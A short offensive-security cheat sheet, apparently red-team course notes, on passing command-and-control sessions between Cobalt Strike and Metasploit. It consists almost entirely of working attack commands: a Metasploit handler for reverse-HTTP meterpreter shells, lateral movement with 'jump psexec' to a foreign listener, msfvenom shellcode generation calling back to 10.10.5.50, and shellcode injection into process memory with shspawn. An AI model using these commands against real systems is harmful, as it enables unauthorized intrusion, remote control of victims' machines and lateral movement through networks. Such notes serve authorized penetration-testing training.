# Session Passing

## CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)

    beacon> spawn x64 http

## CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)

# Setup Metasploit listener

    attacker@ubuntu ~> sudo msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
    msf6 exploit(multi/handler) > set LHOST ens5
    msf6 exploit(multi/handler) > set LPORT 8080
    msf6 exploit(multi/handler) > run

# Setup a Foreign Listener in cobalt strike with above IP & port details

# Use Jump psexec to execute the beacon payload and pass the session

    beacon> jump psexec Foreign_listener

## CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)

# Setup up metasploit

    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
    msf6 exploit(multi/handler) > exploit

# Generate binary

    ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# Inject msf shellcode into process memory

    beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
